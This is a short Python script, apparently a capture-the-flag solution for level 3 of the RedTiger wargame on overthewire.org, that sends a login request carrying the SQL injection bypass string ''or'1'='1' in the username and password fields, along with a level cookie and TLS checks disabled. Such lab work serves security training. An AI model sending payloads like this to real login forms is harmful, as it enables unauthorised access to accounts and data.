import requests
requests.packages.urllib3.disable_warnings()
url = "http://redtiger.labs.overthewire.org/level3.php"
cookies = {"level2login":"easylevelsareeasy"}
payload = {
	"username":"'or'1'='1",
	"password":"'or'1'='1",
	"login":"Login"
}
resp = requests.post(url, cookies=cookies, data=payload, verify=False)
print(resp.content)
